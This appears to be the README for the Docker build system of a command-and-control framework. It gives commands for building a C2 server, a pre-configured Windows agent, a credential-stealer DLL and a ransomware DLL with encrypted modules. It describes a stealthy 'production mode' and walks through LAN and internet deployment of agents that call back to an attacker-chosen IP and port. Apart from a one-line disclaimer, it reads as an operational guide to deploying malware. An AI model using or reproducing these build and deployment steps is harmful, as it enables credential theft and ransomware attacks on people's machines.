# 🐳 Docker Build System - C2R2-v2

Build all C2R2-v2 components with a single command using Docker.

## ⚡ Quick Start

```bash
# Option 1: Using the helper script
./docker-build.sh --ip 192.168.1.10 --port 4444

# Option 2: Using docker-compose directly
cp .env.example .env
nano .env  # Configure SERVER_IP and SERVER_PORT
docker-compose up --build

# All binaries will be in dist/
ls -lh dist/
```

That's it! All binaries (server, agent, builder, DLLs) are ready in `dist/`.

---

## 📦 Generated Binaries

After compilation, the `dist/` directory contains:

```
dist/
├── c2r2-server           # C2 server for Linux x86_64
├── c2r2-server-arm64     # C2 server for ARM64 (Raspberry Pi)
├── agent.exe             # Windows agent (pre-configured)
├── builder               # Agent builder tool
├── stealer.dll           # Credential stealer module
├── ransomware.dll        # Ransomware module
├── modules/              # Encrypted modules ready for deployment
│   ├── stealer.enc
│   ├── stealer.key
│   ├── ransomware.enc
│   └── ransomware.key
└── BUILD_INFO.txt        # Build configuration info
```

---

## 🔧 Configuration

### Environment Variables

Create a `.env` file or pass variables directly:

| Variable | Description | Default |
|----------|-------------|---------|
| `SERVER_IP` | IP address agents connect to | `127.0.0.1` |
| `SERVER_PORT` | Server port | `4444` |
| `AGENT_NAME` | Output agent filename | `agent` |
| `PRODUCTION_MODE` | `true` for stealthy, `false` for debug | `false` |

### Configuration File

```bash
cp .env.example .env
nano .env
```

```bash
# .env file
SERVER_IP=192.168.1.10
SERVER_PORT=4444
AGENT_NAME=agent
PRODUCTION_MODE=false
```

---

## 📋 Build Modes

### Development Mode (`PRODUCTION_MODE=false`)
- ✅ Console window visible for debugging
- ✅ Debug prints enabled
- ✅ Ideal for testing and development
- ⚠️ **DO NOT use in real operations**

### Production Mode (`PRODUCTION_MODE=true`)
- ✅ No console window (100% stealthy)
- ✅ No debug prints
- ✅ Completely silent operation
- ✅ Ready for deployments

```bash
# Development build
PRODUCTION_MODE=false docker-compose up --build

# Production build
PRODUCTION_MODE=true docker-compose up --build
```

---

## 🎯 Usage Examples

### Example 1: Local Testing

```bash
SERVER_IP=127.0.0.1 SERVER_PORT=4444 PRODUCTION_MODE=false docker-compose up --build

# Then run:
cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# On Windows: run agent.exe
```

### Example 2: LAN Deployment

```bash
SERVER_IP=192.168.1.100 SERVER_PORT=4444 AGENT_NAME=agent-lan docker-compose up --build

cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
# Transfer agent-lan.exe to Windows machines on LAN
```

### Example 3: Internet Deployment (with port forwarding)

```bash
# Use your public IP
SERVER_IP=203.0.113.50 SERVER_PORT=4444 PRODUCTION_MODE=true docker-compose up --build

# Configure router: forward external 4444 → internal 4444
# Open firewall
sudo ufw allow 4444/tcp

cd dist
./c2r2-server --bind 0.0.0.0 --port 4444
```

### Example 4: Multiple Agents

```bash
# Agent for LAN
SERVER_IP=192.168.1.10 AGENT_NAME=agent-lan docker-compose up --build
mv dist/agent-lan.exe ./agents/

# Agent for Internet
SERVER_IP=203.0.113.50 AGENT_NAME=agent-wan docker-compose up --build
mv dist/agent-wan.exe ./agents/

# Stealthy agent
SERVER_IP=203.0.113.50 AGENT_NAME=agent-stealth PRODUCTION_MODE=true docker-compose up --build
mv dist/agent-stealth.exe ./agents/
```

---

## 🔍 Verification

After building, verify the binaries:

```bash
# View build info
cat dist/BUILD_INFO.txt

# Verify server
file dist/c2r2-server
dist/c2r2-server --version

# Verify agent
file dist/agent.exe

# Verify modules
ls -lh dist/modules/

# Run validation script
./validate-build.sh
```

---

## 🐛 Troubleshooting

### "Cannot connect to Docker daemon"

```bash
# Start Docker
sudo systemctl start docker

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker
```

### "Permission denied" on dist/

```bash
sudo chown -R $USER:$USER dist/
```

### Binaries not appearing in dist/

```bash
# Clean and rebuild
docker-compose down
rm -rf dist/
docker-compose up --build
```

### Agent doesn't connect

1. Check configured IP:
   ```bash
   grep SERVER_IP .env
   ```

2. Check server is listening:
   ```bash
   netstat -tlnp | grep 4444
   ```

3. Check firewall:
   ```bash
   sudo ufw status
   sudo ufw allow 4444/tcp
   ```

---

## 🧹 Cleanup

```bash
# Stop containers
docker-compose down

# Remove Docker image
docker rmi c2r2-builder:latest

# Remove built binaries
rm -rf dist/
```

---

## 📚 Related Documentation

- [Installation Guide](../INSTALLATION.md) - Manual build instructions
- [Network Deployment](NETWORK_DEPLOYMENT.md) - LAN/WAN configuration
- [Raspberry Pi Setup](RASPBERRY_PI_SETUP.md) - Pi-specific instructions

---

**⚠️ Legal Disclaimer**: For authorized security testing purposes only. Unauthorized use is illegal.
